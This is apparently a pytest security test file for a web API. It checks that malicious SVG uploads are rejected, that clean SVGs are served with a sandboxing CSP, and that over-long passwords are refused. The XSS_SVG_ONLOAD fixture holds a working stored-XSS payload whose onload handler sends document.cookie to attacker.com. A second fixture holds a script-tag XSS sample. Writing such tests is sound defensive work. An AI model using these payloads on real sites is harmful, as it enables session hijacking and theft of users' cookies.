import pytest
from httpx import AsyncClient

CLEAN_SVG = b"""<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100">
  <circle cx="50" cy="50" r="40" stroke="#A16C50" stroke-width="4" fill="#202221" />
</svg>"""

XSS_SVG_SCRIPT = b"""<svg xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    alert('Stored XSS Vulnerability');
  </script>
  <circle cx="50" cy="50" r="40" fill="red" />
</svg>"""

XSS_SVG_ONLOAD = b"""<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker.com/steal?cookie=' + document.cookie)">
  <rect width="100" height="100" fill="blue" />
</svg>"""

@pytest.mark.asyncio
async def test_svg_script_injection_rejected(client: AsyncClient, auth_headers: dict):
    # Fetch Orion-9 ID
    orion_res = await client.get("/api/v1/products/orion-9", headers=auth_headers)
    product_id = orion_res.json()["id"]

    # 1. Attempt upload of SVG with <script> tag -> MUST BE REJECTED 400
    res_script = await client.post(
        "/api/v1/assets/upload",
        data={"product_id": product_id, "asset_type": "image"},
        files={"file": ("malicious_script.svg", XSS_SVG_SCRIPT, "image/svg+xml")},
        headers=auth_headers
    )
    assert res_script.status_code == 400
    assert "signature" in res_script.json()["detail"].lower() or "rejected" in res_script.json()["detail"].lower()

    # 2. Attempt upload of SVG with onload event handler -> MUST BE REJECTED 400
    res_onload = await client.post(
        "/api/v1/assets/upload",
        data={"product_id": product_id, "asset_type": "image"},
        files={"file": ("malicious_onload.svg", XSS_SVG_ONLOAD, "image/svg+xml")},
        headers=auth_headers
    )
    assert res_onload.status_code == 400

    # 3. Upload Clean SVG -> MUST SUCCEED 201
    res_clean = await client.post(
        "/api/v1/assets/upload",
        data={"product_id": product_id, "asset_type": "image"},
        files={"file": ("clean_brand_logo.svg", CLEAN_SVG, "image/svg+xml")},
        headers=auth_headers
    )
    assert res_clean.status_code == 201
    svg_id = res_clean.json()["id"]

    # 4. Download Clean SVG -> Verify CSP and attachment disposition
    dl_res = await client.get(f"/api/v1/assets/{svg_id}/download", headers=auth_headers)
    assert dl_res.status_code == 200
    assert "Content-Security-Policy" in dl_res.headers
    assert "sandbox" in dl_res.headers["Content-Security-Policy"]
    assert "attachment" in dl_res.headers["Content-Disposition"]

@pytest.mark.asyncio
async def test_unbounded_login_password_dos_mitigation(client: AsyncClient):
    """
    Ensure login endpoint rejects excessively long passwords (>128 chars)
    at the schema validation boundary without triggering Argon2id CPU exhaustion.
    """
    giant_password = "A" * 2000
    res = await client.post("/api/v1/auth/login", json={
        "email": "founder@prometheus9.ai",
        "password": giant_password
    })
    assert res.status_code == 422
